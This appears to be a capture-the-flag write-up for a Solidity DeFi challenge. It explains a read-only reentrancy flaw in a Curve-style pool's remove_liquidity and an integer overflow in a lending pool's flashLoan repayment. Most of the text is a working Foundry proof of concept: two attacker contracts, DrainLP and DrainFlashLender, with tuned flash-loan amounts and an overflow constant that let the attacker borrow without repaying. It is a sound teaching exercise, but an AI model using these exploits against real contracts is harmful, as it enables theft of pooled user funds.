# Analysis

## Bug of the `CurvePool`
In the `CurvePool.remove_liquidity()`:
```solidity
    function remove_liquidity(
        uint _amount, 
        uint[2] memory _min_amounts
    ) external nonReentrant returns (uint[2] memory) {
        ...
        require(CurveToken(token).burnFrom(msg.sender, _amount), "Insufficient funds");

        for (uint i; i < 2; i++) {
            ...
            if (i == 0) {
                (bool success,) = msg.sender.call{value: value}(""); // eth sent before weth
                require(success);
            } else {
                require(ERC20(coins[1]).transfer(msg.sender, value));
            }
        }

        ...
    }

```
First, it burns the LP tokens, then returns both ether and weth to user. It should return ether AFTER weth, but it does the reverse. When it calls `msg.sender.call{value: value}("")`, the ether is sent but the weth is not, which causes the pool unbalanced. Functions `get_virtual_price()` is affected by the unblance:
```solidity
    function get_virtual_price() external view returns (uint) {
        uint d = get_D(_balances(0), _A());
        uint token_supply = ERC20(lp_token).totalSupply(); // <--- decreased
        return d * PRECISION / token_supply; // <---- pumps
    }

```
At this moment, since the LP is burned, the `token_supply` is decreased, and the return value pumps to a higher price. The more it decreases, the higher the price pumps. When the price pumps we can buy more MetaToken than we're supposed to. When the `remove_liquidity()` returns, the pool goes back to balanced again, the price goes low, then we sell the MetaToken to drain it, and we get more LP token than previously we have.

So the solution is:
0. use our 10 ether to get about 10 ether of LP
1. flashloan a large amount of weth, then `add_liquidity()`
2. call `remove_liquidity()` to pump the price to 7 times
3. in the `receive()` callback, buy MetaToken with our 10 ether of LP
4. after the `remove_liquidity()`, sell the MetaToken, the previous 10 ether of LP now becomes 70 ether
5. sell the LP and repay the flashloan and fee

### The flashloan amount
To calculate the amount of flashloan, I tried to dive into the numeric algorithm, but it's so complex then I tried bisection method, eg: try the number 1, if it's too small then try 2, if still too smal then try 4, if too large then try 3. 
After a couple of minutes I got this number: `1046_982343863283000000`, which pumps the price to 7 times, so our 10 ether becomes 70 ether and the MetaPool is drained.


## Bug of the `LendingPool`
The contract is compiled with solc of version `0.6`, before version `0.8` there's always the number overflow bug:
```solidity
    function flashLoan(
        IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data
    ) external override returns (bool) {
        ...
        uint256 repayAmount;
        repayAmount = amount + feeAmount;
        require(WETH.transferFrom(address(receiver), address(this), repayAmount), "LendingPool: flash loan amount + fee not returned");
        return true;
    }

```
If we find an `amount` that satisfies `amount + feeAmount == 0`(overflows to 0), it means we can borrow token without returning it(return 0 amount).

The fomular is:
repayAmount == amount + fee == amount + amount/1000*5 == uint.max + 1 == 2**256
    =>
amount + amount/1000*5 == 2**256
1005*amount == 2**256*1000
    =>
amount == 0xfeb9f34380a3065e3fae7cd0e028c1978feb9f34380a3065e3fae7cd0e028c1a



# POC
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CurvePool.sol";
import "../src/CurveToken.sol";
import "../src/interfaces/ILendingPool.sol";
import "../src/MetaPoolToken.sol";
import "../src/interfaces/IERC3156.sol";
import "forge-std/console.sol";



contract Challenge is Test {
    ILendingPool public wethLendingPool;
    CurvePool public swapPoolEthWeth;
    CurveToken public lpToken;
    IWETH public weth;
    MetaPoolToken public metaToken;
    address hacker;
    address alice;
    address bob;

    function setUp() public {
        vm.createSelectFork("https://sepolia.gateway.tenderly.co");

        weth = IWETH(payable(0x1194A239875cD36C9B960FF2d3d8d0f800435290));
        wethLendingPool = ILendingPool(0x66Df966E887e73b2f46456e062213B0C0fB42037);
        assertEq(address(wethLendingPool.WETH()), address(weth));
        assertEq(address(wethLendingPool.WETH()), address(weth));
        lpToken = new CurveToken();
        swapPoolEthWeth = new CurvePool(
            msg.sender, 
            [
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                address(weth)
            ],
            address(lpToken), 
            5,
            4000000,
            5000000000
        );
        lpToken.initialize(address(swapPoolEthWeth));
        metaToken = new MetaPoolToken(lpToken, swapPoolEthWeth);
        // deal(address(lpToken), address(metaToken), 10000 ether, true);

        hacker = makeAddr("hacker");
        alice = makeAddr("alice");
        bob = makeAddr("bob");

        uint[2] memory amounts;// = [10 ether, 10 ether];
        amounts[0] = 10 ether;
        amounts[1] = 10 ether;

        deal(alice, 20 ether);
        vm.startPrank(alice);
        
        weth.deposit{value: 10 ether}();
        assertEq(weth.balanceOf(alice), 10 ether, "alice failed");
        weth.approve(address(swapPoolEthWeth), type(uint).max);
        swapPoolEthWeth.add_liquidity{value: 10 ether}(amounts, 0);
        lpToken.approve(address(metaToken), type(uint).max);
        metaToken.mint(lpToken.balanceOf(alice));
        assertGt(metaToken.balanceOf(alice),0);
        vm.stopPrank();

        // amounts = [20 ether, 20 ether];
        amounts[0] = 20 ether;
        amounts[1] = 20 ether;

        deal(bob, 40 ether);
        vm.startPrank(bob);
        
        weth.deposit{value: 20 ether}();
        assertEq(weth.balanceOf(bob), 20 ether, "bob failed");
        weth.approve(address(swapPoolEthWeth), type(uint).max);
        swapPoolEthWeth.add_liquidity{value: 20 ether}(amounts, 0);
        lpToken.approve(address(metaToken), type(uint).max);
        metaToken.mint(lpToken.balanceOf(bob));
        assertGt(metaToken.balanceOf(bob),0);
        vm.stopPrank();

        // Provide initial liquidity to lending pool (and lots of it!)
        deal(address(this), type(uint256).max - 70 ether);
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(wethLendingPool), weth.balanceOf(address(this)));

        // Provide hacker with some ETH to start with
        deal(hacker, 10 ether);
    }

    function testHack() public {
        uint lendingPoolWethBalance = weth.balanceOf(address(wethLendingPool));
        
        vm.startPrank(hacker, hacker);

        //Your Solution        

		// 1. drain all LP tokens 
		{
			DrainLP c = new DrainLP{value: address(hacker).balance}(
				wethLendingPool, swapPoolEthWeth, lpToken, weth, metaToken);
			c.attack();
		}


		// 2. drain the lender pool
		{
			DrainFlashLender c = new DrainFlashLender(
				wethLendingPool, weth);
			c.attack();
			weth.withdraw(weth.balanceOf(hacker));
		}


        vm.stopPrank();

        assertLt(weth.balanceOf(address(wethLendingPool)), lendingPoolWethBalance, "Did not steal WETH from LendingPool");
        assertApproxEqAbs(lpToken.balanceOf(address(metaToken)), 0, 1e5, "Did not completely drain LP tokens from MetaPoolToken");
        assertApproxEqRel(address(hacker).balance / weth.balanceOf(address(wethLendingPool)), 200, 5, "Did not obtain approx. 200x as much ETH as the final WETH lending pool balance");
    }
}

contract DrainLP is IERC3156FlashBorrower {
    ILendingPool  public wethLendingPool;
    CurvePool     public swapPoolEthWeth;
    CurveToken    public lpToken;
    IWETH         public weth;
    MetaPoolToken public metaToken;

	address hacker;

	constructor(
		ILendingPool  a1,
		CurvePool     a2,
		CurveToken    a3,
		IWETH         a4,
		MetaPoolToken a5
	) payable {
		hacker          = msg.sender;

		wethLendingPool = a1;
		swapPoolEthWeth = a2;
		lpToken         = a3;
		weth            = a4;
		metaToken       = a5;
	}

	function attack() external {

		{ // 1. buy 10 eth lp
			weth.approve(address(wethLendingPool), type(uint).max);
			weth.approve(address(swapPoolEthWeth), type(uint).max);

			uint v0 = 5 ether;
			uint v1 = 5 ether;

			weth.deposit{value: v1}(); // eth -> weth
		
			uint[2] memory amounts;
			amounts[0] = v0;
			amounts[1] = v1;
			uint lp = swapPoolEthWeth.add_liquidity{value: v0}(amounts, 0);
		}


		{ // flashloan
			uint borrow = 1046_982343863283000000;
			wethLendingPool.flashLoan(
				IERC3156FlashBorrower(this), address(weth), borrow, "");
		}
		// transfer eth/weth back to hacker
		{
			payable(hacker).call{value: address(this).balance}("");
			weth.transfer(hacker, weth.balanceOf(address(this)));
		}
	}

	bool flagHandleReceive;
	receive() external payable {
		if (!flagHandleReceive ) {
			return;
		}
		flagHandleReceive = false;
 

		{ // here, lp price is very high, so we can buy more metaToken

			uint lp = lpToken.balanceOf(address(this));

			lpToken.approve(address(metaToken), type(uint).max);
			metaToken.mint(lp);
		}
	}

	function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {

		{ // buy some lp, then sell it to break the balance and trigger the `receive()` callback

			uint half = amount/2;

			weth.withdraw(half);

			uint[2] memory amounts;
			amounts[0] = half;
			amounts[1] = half;
			uint lp = swapPoolEthWeth.add_liquidity{value: half}(amounts, 0);

			amounts[0] = 0;
			amounts[1] = 0;
			flagHandleReceive = true; // get ready for the `receive()`
			amounts = swapPoolEthWeth.remove_liquidity(lp, amounts);
		}

		// executing `receive()` ...

		{ // When it goes here, lp price gets back to low,
			// sell the metaToken to get more lp
			uint meta = metaToken.balanceOf(address(this));
			metaToken.burn(meta);
		}

		{ // remove liquidity -> eth/weth

			uint lp = lpToken.balanceOf(address(this));
			uint[2] memory amounts;
			amounts[0] = 0;
			amounts[1] = 0;
			amounts = swapPoolEthWeth.remove_liquidity(lp, amounts);
		}

		// return funds
		{
			weth.deposit{value: address(this).balance}(); // all eth -> weth
		}

		return keccak256("ERC3156FlashBorrower.onFlashLoan");
	}
}

contract DrainFlashLender is IERC3156FlashBorrower {
    ILendingPool  public wethLendingPool;
    IWETH         public weth;

	address hacker;

	constructor(
		ILendingPool  a1,
		IWETH         a2
	) payable {
		hacker          = msg.sender;

		wethLendingPool = a1;
		weth            = a2;
	}

	function attack() external {

		// flashloan weth without returning
		{
			uint borrow = 0xfeb9f34380a3065e3fae7cd0e028c1978feb9f34380a3065e3fae7cd0e028c1a;
			wethLendingPool.flashLoan(
				IERC3156FlashBorrower(this), address(weth), borrow, "");
		}

		// transfer weth back to hacker
		{
			weth.transfer(hacker, weth.balanceOf(address(this)));
		}
	}

	function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {
		return keccak256("ERC3156FlashBorrower.onFlashLoan");
	}

}

```
